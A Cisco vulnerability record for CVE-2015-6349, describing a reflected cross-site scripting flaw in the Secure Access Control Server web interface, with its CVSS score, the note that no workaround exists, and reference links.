RNE: Symptom: A vulnerability in the Cisco Secure Access Control Server (ACS) web interface could allow an unauthenticated,  remote attacker to impact the integrity of the system by executing a reflective cross-site scripting (XSS) attack.  The vulnerability is due to a lack of input validation on user-supplied input. An attacker could exploit this vulnerability  by sending a crafted URL to the affected system. An exploit could allow the attacker to effect the integrity of the system because of database manipulation.  Conditions: Device running with default configuration running an affected version of software.  Workaround: None  Further Problem Description: Additional information about XSS attacks and potential mitigations can be found at:  http://www.cisco.com/en/US/products/cmb/cisco-amb-20060922-understanding-xss.html https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/4.1: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:P/A:N/E:F/RL:U/RC:C&version=2.0 CVE ID CVE-2015-6349 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
